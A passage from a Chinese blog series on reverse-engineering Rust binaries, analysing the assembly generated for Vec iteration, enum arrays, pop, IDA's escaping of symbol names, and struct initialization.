.LBB46_10</span><br></pre></td></tr></table></figure>
<p>上面即为<code>for</code>循环的其中一段，其中<code>[rsp+40]</code>是<code>Vec</code>实例的地址。首先可以看到程序将<code>Vec</code>实例复制了一份，随后调用了<code>into_iter</code>方法获取了一个迭代器实例，该方法的第一个参数为需要初始化迭代器的地址，第二个参数为复制的<code>Vec</code>的地址。这个方法是可以单独调用的，返回一个迭代器：<code>fn into_iter(self) -&gt; Self::IntoIter</code>。从下面的汇编代码（复制到<code>[rsp+128]</code>）可以得知，这个迭代器实例在栈中的大小为0x20。下面是这个迭代器在调试时获取的最初状态：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">08:0040│ rax rcx 0x7fffffffd840 —▸ 0x5555555b4ba0 ◂— 0x200000001</span><br><span class="line">09:0048│         0x7fffffffd848 ◂— 0x6</span><br><span class="line">0a:0050│         0x7fffffffd850 —▸ 0x5555555b4ba0 ◂— 0x200000001</span><br><span class="line">0b:0058│         0x7fffffffd858 —▸ 0x5555555b4bb0 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>其中第1个和第3个字保存的都是数组的起始地址，第4个字保存的是数组的末尾地址，第2个字的6保存的是数组的容量，注意这里的容量与数组长度不同，数组长度为4，但容量为6，只不过后面2个元素暂时还未被创建。</p>
<p>往下，代码调用了<code>next</code>方法，获取迭代器中的下一个元素，下面是调用后迭代器的状态：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10:0080│ rcx rdi 0x7fffffffd880 —▸ 0x5555555b4ba0 ◂— 0x200000001</span><br><span class="line">11:0088│         0x7fffffffd888 ◂— 0x6</span><br><span class="line">12:0090│         0x7fffffffd890 —▸ 0x5555555b4ba4 ◂— 0x300000002</span><br><span class="line">13:0098│         0x7fffffffd898 —▸ 0x5555555b4bb0 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>可以看到第三个字表示的实际上就是当前的指针。<code>next</code>方法返回的是一个<code>Option&lt;T&gt;</code>实例，索引值和数据分别被保存在<code>rax</code>和<code>rdx</code>中。这一点在下面的汇编代码中得以证实。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.LBB46_10:</span><br><span class="line">        mov     eax, dword ptr [rsp + 16]</span><br><span class="line">        mov     ecx, dword ptr [rsp + 20]</span><br><span class="line">        mov     dword ptr [rsp + 164], ecx</span><br><span class="line">        mov     dword ptr [rsp + 168], eax</span><br><span class="line">        mov     eax, dword ptr [rsp + 164]</span><br><span class="line">        cmp     rax, 0</span><br><span class="line">        jne     .LBB46_12</span><br><span class="line">        mov     rax, qword ptr [rip + core::ptr::drop_in_place&lt;alloc::vec::into_iter::IntoIter&lt;i32&gt;&gt;@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 128]</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB46_13</span><br></pre></td></tr></table></figure>
<p>下面的代码中进行了一个比较，通过数据流分析可以发现这里是将<code>next</code>返回值与0进行比较，在<code>Option&lt;T&gt;</code>中，如果<code>T</code>不是一个枚举类型，那么枚举索引值为1表示有效值，0则表示无效值。随后就是正常的宏展开与输出，输出内容后无条件跳转回<code>next</code>方法调用前，继续调用<code>next</code>方法获取下一个值。</p>
<p>当<code>next</code>方法调用失败，即已经到达迭代器的终点时，通过调试发现，返回的<code>rax</code>值为0，<code>rdx</code>值为0x5555。后续则是判断失败后跳出循环。</p>
<p>注意，上面的代码是<code>for i in x</code>，这里的x由于没有使用引用，在<code>for</code>循环一开始就丧失了所有权，其所有权会被转移到迭代器中，当<code>for</code>循环结束后，迭代器被销毁，后续将不能使用变量<code>x</code>。</p>
<p>如果使用<code>for i in &amp;x</code>，情况则会有些许的不同，<strong>不仔细观察还真的容易忽略</strong>。</p>
<p>注意看，下面是两个<code>into_iter</code>方法在IDA反汇编界面中的函数名：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_$LT$$RF$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::hed888fce85d317be</span><br><span class="line"></span><br><span class="line">_$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::he37dcd381eb06c85</span><br></pre></td></tr></table></figure>
<p>可能你会纳闷：这里为啥会有这么多<code>$</code>符号？实际上，这是IDA用于表示某些标点符号的转义字符，这个转义的规则与Javascript类似。<code>$LT$</code>表示<code>&lt;</code>，<code>$GT$</code>表示<code>&gt;</code>，<code>$RF$</code>表示<code>&amp;</code>，<code>$C$</code>表示<code>,</code>，<code>$u??$</code>表示<code>\x??</code>。因此上面的函数名就等同于：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;&amp;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter::hed888fce85d317be</span><br><span class="line"></span><br><span class="line">&lt;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter::he37dcd381eb06c85</span><br></pre></td></tr></table></figure>
<p>上面那个是<code>for i in &amp;x</code>调用的方法，下面是<code>for i in x</code>调用的方法，除了后面的哈希值之外，函数名真的只有一个<code>&amp;</code>的差别。也即上面的方法是针对<code>&amp;Vec</code>，下面的是针对<code>Vec</code>。二者的参数不同，上面那个只有1个参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.LBB33_5:</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;&amp;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 64]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 32], rdx</span><br><span class="line">        mov     qword ptr [rsp + 40], rax</span><br><span class="line">        jmp     .LBB33_6</span><br></pre></td></tr></table></figure>
<p>即<code>Vec</code>实例的地址。</p>
<p>且二者的返回值也不同，对于<code>&lt;&amp;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter</code>，其返回值保存在<code>rax</code>和<code>rdx</code>中，其中<code>rax</code>为数组的开始地址，<code>rdx</code>为数组的结束地址。实际返回的迭代器的大小也只有16个字节。</p>
<p><code>for i in &amp;x</code>后面的汇编代码段如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.LBB33_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 32]</span><br><span class="line">        mov     rcx, qword ptr [rsp + 40]</span><br><span class="line">        mov     qword ptr [rsp + 88], rcx</span><br><span class="line">        mov     qword ptr [rsp + 96], rax</span><br><span class="line">.LBB33_7:</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;core::slice::iter::Iter&lt;T&gt; as core::iter::traits::iterator::Iterator&gt;::next@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 88]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        jmp     .LBB33_8</span><br><span class="line">.LBB33_8:</span><br><span class="line">        mov     rax, qword ptr [rsp + 24]</span><br><span class="line">        mov     qword ptr [rsp + 104], rax</span><br><span class="line">        mov     rdx, qword ptr [rsp + 104]</span><br><span class="line">        mov     eax, 1</span><br><span class="line">        xor     ecx, ecx</span><br><span class="line">        cmp     rdx, 0</span><br><span class="line">        cmove   rax, rcx</span><br><span class="line">        cmp     rax, 0</span><br><span class="line">        jne     .LBB33_10</span><br></pre></td></tr></table></figure>
<p>可以看到这里调用的<code>next</code>方法也和不加<code>&amp;</code>的不一样，参数只有1个，即数组的开始地址，返回值只有1个，即下一个元素的地址，该函数调用后，迭代器中的指针位置向前移动。可见对于引用类型的迭代器结构更为简单，只需要一个动态指针和一个结束指针即可，什么时候动态指针等于结束指针，迭代也就结束。</p>
<h2 id="枚举数组"><a class="markdownIt-Anchor" href="#枚举数组"></a> 枚举数组</h2>
<p>对于元素类型是枚举类型的数组，目前只有一个疑问：当枚举类型中不同枚举项所跟的数据类型不同，占用内存大小不同时，Rust将如何进行处理。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Shapes</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Round</span>(<span class="type">f64</span>),</span><br><span class="line">    <span class="title function_ invoke__">Rectangle</span>(<span class="type">f64</span>, <span class="type">f64</span>),</span><br><span class="line">    <span class="title function_ invoke__">Triangle</span>(<span class="type">f64</span>, <span class="type">f64</span>, <span class="type">f64</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[</span><br><span class="line">        Shapes::<span class="title function_ invoke__">Round</span>(<span class="number">3.5</span>),</span><br><span class="line">        Shapes::<span class="title function_ invoke__">Rectangle</span>(<span class="number">7.5</span>, <span class="number">9.6</span>),</span><br><span class="line">        Shapes::<span class="title function_ invoke__">Triangle</span>(<span class="number">114.514</span>, <span class="number">19.1981</span>, <span class="number">1.57</span>)</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 136</span><br><span class="line">        mov     edi, 96</span><br><span class="line">        mov     esi, 8</span><br><span class="line">        call    alloc::alloc::exchange_malloc</span><br><span class="line">        mov     qword ptr [rsp + 8], rax</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_5]</span><br><span class="line">        movsd   qword ptr [rsp + 48], xmm0</span><br><span class="line">        mov     qword ptr [rsp + 40], 0</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_4]</span><br><span class="line">        movsd   qword ptr [rsp + 80], xmm0</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_3]</span><br><span class="line">        movsd   qword ptr [rsp + 88], xmm0</span><br><span class="line">        mov     qword ptr [rsp + 72], 1</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_2]</span><br><span class="line">        movsd   qword ptr [rsp + 112], xmm0</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_1]</span><br><span class="line">        movsd   qword ptr [rsp + 120], xmm0</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_0]</span><br><span class="line">        movsd   qword ptr [rsp + 128], xmm0</span><br><span class="line">        mov     qword ptr [rsp + 104], 2</span><br><span class="line">        and     rax, 7</span><br><span class="line">        cmp     rax, 0</span><br><span class="line">        sete    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB10_1</span><br><span class="line">        jmp     .LBB10_2</span><br><span class="line">.LBB10_1:</span><br><span class="line">        mov     rsi, qword ptr [rsp + 8]</span><br><span class="line">        mov     rax, qword ptr [rsp + 40]</span><br><span class="line">        mov     qword ptr [rsi], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 48]</span><br><span class="line">        mov     qword ptr [rsi + 8], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 56]</span><br><span class="line">        mov     qword ptr [rsi + 16], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 64]</span><br><span class="line">        mov     qword ptr [rsi + 24], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 72]</span><br><span class="line">        mov     qword ptr [rsi + 32], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 80]</span><br><span class="line">        mov     qword ptr [rsi + 40], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 88]</span><br><span class="line">        mov     qword ptr [rsi + 48], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 96]</span><br><span class="line">        mov     qword ptr [rsi + 56], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 104]</span><br><span class="line">        mov     qword ptr [rsi + 64], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 112]</span><br><span class="line">        mov     qword ptr [rsi + 72], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 120]</span><br><span class="line">        mov     qword ptr [rsi + 80], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 128]</span><br><span class="line">        mov     qword ptr [rsi + 88], rax</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        mov     edx, 3</span><br><span class="line">        call    qword ptr [rip + alloc::slice::&lt;impl [T]&gt;::into_vec@GOTPCREL]</span><br></pre></td></tr></table></figure>
<p>可以看到，Rust编译器似乎很喜欢通过大量的<code>mov</code>系列指令完成内存复制操作，在上面的示例中可以发现，Rust是将枚举类型可能占用的最大内存大小作为数组一个元素的大小进行存储，在下面的内存拷贝操作中甚至还拷贝了未被初始化的内存区域。我们可以将每一个枚举类型后面跟的值视作一个大的union结构，一个枚举类型的不同实例占用的内存大小相同，即使其中一个实例只保存了8字节而另一个实例保存了80字节，前者也需要80个字节的空间保存数据。这会造成一定的内存浪费，但便于数组索引寻址。</p>
<h2 id="弹出最后一个元素pop"><a class="markdownIt-Anchor" href="#弹出最后一个元素pop"></a> 弹出最后一个元素——pop</h2>
<p><code>Vec</code>的<code>pop</code>方法能够弹出数组中最后一个元素，并在数组中将其删除。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x.<span class="title function_ invoke__">pop</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.LBB31_5:</span><br><span class="line">        mov     rax, qword ptr [rip + alloc::vec::Vec&lt;T,A&gt;::pop@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 32]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     dword ptr [rsp + 8], edx</span><br><span class="line">        mov     dword ptr [rsp + 12], eax</span><br><span class="line">        jmp     .LBB31_6</span><br><span class="line">.LBB31_6:</span><br><span class="line">        mov     esi, dword ptr [rsp + 8]</span><br><span class="line">        mov     edi, dword ptr [rsp + 12]</span><br><span class="line">        lea     rdx, [rip + .L__unnamed_5]</span><br><span class="line">        mov     rax, qword ptr [rip + core::option::Option&lt;T&gt;::unwrap@GOTPCREL]</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB31_7</span><br></pre></td></tr></table></figure>
<p><code>pop</code>的参数只有一个，即<code>Vec</code>实例地址，返回值是<code>Option&lt;T&gt;</code>，<code>rdx</code>为有效值，<code>rax</code>为是否有效的索引值，1为有效。该方法调用后，数组的大小会变化，但容量不变，真正保存值的静态数组指针中的值也不变，而且也不需要改变，因为数组大小变小，所以后面的值在正常情况下无法访问。</p>
<p>在参考书中只给出了插入元素、获取元素、遍历元素等几个为数不多的<code>Vec</code>操作方法，但实际上<code>Vec</code>能完成的功能远不止于此，考虑到<code>Vec</code>的方法实在太多，这里无法全部完成分析，就先到这里了。不过我们已经掌握了<code>Vec</code>的基本结构，对于其他方法的分析也就万变不离其宗。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文我们学习了：</p>
<ol>
<li><code>Vec</code>动态数组结构在内存中的结构。</li>
<li><code>Vec</code>在最后添加、删除元素、遍历、访问值的相关方法分析。</li>
<li>IDA中对一些含有特殊字符的Rust方法的转义方式与Javascript类似。</li>
<li>枚举类型构成的数组中，每个枚举类型占用的内存大小相同，可能导致内存空间浪费。</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/10/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/10/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-4/" class="post-title-link" itemprop="url">Rust逆向学习 (4)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-10 14:41:05 / 修改时间：20:17:51" itemprop="dateCreated datePublished" datetime="2023-11-10T14:41:05+08:00">2023-11-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="reverse-for-struct"><a class="markdownIt-Anchor" href="#reverse-for-struct"></a> Reverse for Struct</h1>
<p>Rust中的结构体是一个重要的内容，由于Rust中没有类的概念，因此其他编程语言中的封装、继承、多态与Rust中的表现都有较大差异。</p>
<p>我们使用参考书中的一个示例开始进行分析。</p>
<h2 id="struct-初始化"><a class="markdownIt-Anchor" href="#struct-初始化"></a> Struct 初始化</h2>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    username: <span class="type">String</span>,</span><br><span class="line">    email: <span class="type">String</span>,</span><br><span class="line">    sign_in_count: <span class="type">u64</span>,</span><br><span class="line">    active: <span class="type">bool</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">user1</span> = User &#123;</span><br><span class="line">        email: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someone@example.com&quot;</span>),</span><br><span class="line">        username: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someusername123&quot;</span>),</span><br><span class="line">        active: <span class="literal">true</span>,</span><br><span class="line">        sign_in_count: <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;, &#123;&#125;&quot;</span>, user1.email, user1.active);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这段在汇编层是如何处理的呢？</p>
<h3 id="第一段"><a class="markdownIt-Anchor" href="#第一段"></a> 第一段</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 296</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">        lea     rdi, [rsp + 120]</span><br><span class="line">        mov     edx, 19</span><br><span class="line">        call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_6]</span><br><span class="line">        lea     rdi, [rsp + 144]</span><br><span class="line">        mov     edx, 15</span><br><span class="line">        call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br><span class="line">        jmp     .LBB17_3</span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">.L__unnamed_5:</span><br><span class="line">        .ascii  &quot;someone@example.com&quot;</span><br><span class="line"></span><br><span class="line">.L__unnamed_6:</span><br><span class="line">        .ascii  &quot;someusername123&quot;</span><br></pre></td></tr></table></figure>
<p>上面是第一段汇编内容，在源码中，我们是首先对<code>email</code>进行了初始化，在汇编中也是如此。这里分别将两个字符串实例保存到了<code>[rsp+120]</code>和<code>[rsp+144]</code>处。我们之前分析过，<code>String</code>实例在栈中的大小应该为0x18，可见这两个<code>String</code>实例是完全相邻的，中间没有其他的数据。</p>
<h3 id="第二段"><a class="markdownIt-Anchor" href="#第二段"></a> 第二段</h3>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.LBB17_3:</span><br><span class="line">        mov     rax, qword ptr [rsp + <span class="number">160</span>]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">64</span>], rax</span><br><span class="line">        movups  xmm0, xmmword ptr [rsp + <span class="number">144</span>]</span><br><span class="line">        movaps  xmmword ptr [rsp + <span class="number">48</span>], xmm0</span><br><span class="line">        lea     rax, [rsp + <span class="number">72</span>]</span><br><span class="line">        mov     rcx, qword ptr [rsp + <span class="number">136</span>]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">88</span>], rcx</span><br><span class="line">        movups  xmm0, xmmword ptr [rsp + <span class="number">120</span>]</span><br><span class="line">        movups  xmmword ptr [rsp + <span class="number">72</span>], xmm0</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">96</span>], <span class="number">1</span></span><br><span class="line">        mov     byte ptr [rsp + <span class="number">104</span>], <span class="number">1</span></span><br><span class="line">        mov     qword ptr [rsp + <span class="number">280</span>], rax</span><br><span class="line">        lea     rax, [rip + &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::fmt::Display&gt;::fmt]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">288</span>], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + <span class="number">280</span>]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">32</span>], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + <span class="number">288</span>]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">40</span>], rax</span><br><span class="line">        jmp     .LBB17_6</span><br></pre></td></tr></table></figure>
<p>随后是第二段，这里有一个Rust 1.73与Rust 1.69的不同之处，在老版本中，对于宏将会调用<code>core::fmt::ArgumentV1::new_display</code>将中括号对应的内容转为字符串，而在新版本中，则只会将<code>core::fmt::Display</code>函数地址保存到栈而并不调用。并且结构体中各个元素的内存排列顺序也不相同，通过IDA分析可见在1.73版本中，元素排列与元素定义的顺序相同，但老版本中则不是。这里是因为<code>String</code>实例实现了<code>Display</code>这个<code>Trait</code>，所以能够直接输出。输出时调用的实际上也是<code>Display</code>的<code>Trait</code>。</p>
<p>需要注意的是，第一段中的字符串初始化并不是对结构体的字符串直接进行初始化，而是在栈中另外开辟了0x30大小的空间用于初始化这两个字符串，随后将这段内存的内容复制到结构体中。真正的结构体应该位于<code>[rsp+48]</code>。四个元素的保存地址分别为：<code>[rsp+48]</code>，<code>[rsp+72]</code>，<code>[rsp+96]</code>，<code>[rsp+104]</code>，因此，中间的两条指令<code>mov qword ptr [rsp + 96], 1</code>、<code>mov byte ptr [rsp + 104], 1</code>就是在对<code>sign_in_count</code>和<code>active</code>进行初始化，因为二者一个是整数类型，一个是布尔值，都是不需要通过<code>new</code>进行初始化的，因此可以直接赋值。</p>
